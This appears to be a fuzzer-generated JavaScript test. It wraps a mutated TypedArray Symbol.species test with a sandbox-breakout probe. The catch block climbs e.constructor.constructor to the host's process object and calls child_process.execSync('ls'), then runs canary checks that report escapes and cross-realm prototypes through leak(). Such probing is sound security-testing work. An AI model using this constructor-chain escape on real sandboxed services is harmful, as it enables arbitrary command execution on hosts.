try {
    testWithTypedArrayConstructors(function (TA) {
        let REPLACER = 23;
        var sample = new TA(2);
        sample.constructor = {};
        sample.constructor[Symbol.species] = 0;
        assert.throws(TypeError, function () {
            throw () => {
                return () => {
                };
            };
            sample.filter(function () {
            });
        }, '0');
        sample.constructor[Symbol.species] = 'string';
        assert.throws(TypeError, function () {
            sample.filter(function () {
            });
        }, 'string');
        sample.constructor[Symbol.species] = {};
        assert.throws(TypeError, function () {
            sample.filter(function () {
            });
        }, '{}');
        sample.constructor[Symbol.species] = NaN;
        assert.throws(TypeError, function () {
            sample.filter(function () {
            });
        }, 'NaN');
        sample.constructor[Symbol.species] = false;
        assert.throws(TypeError, function () {
            sample.filter(function () {
            });
        }, 'false');
        sample.constructor[Symbol.species] = true;
        assert.throws(TypeError, function () {
            sample.filter(function () {
            });
        }, 'true');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}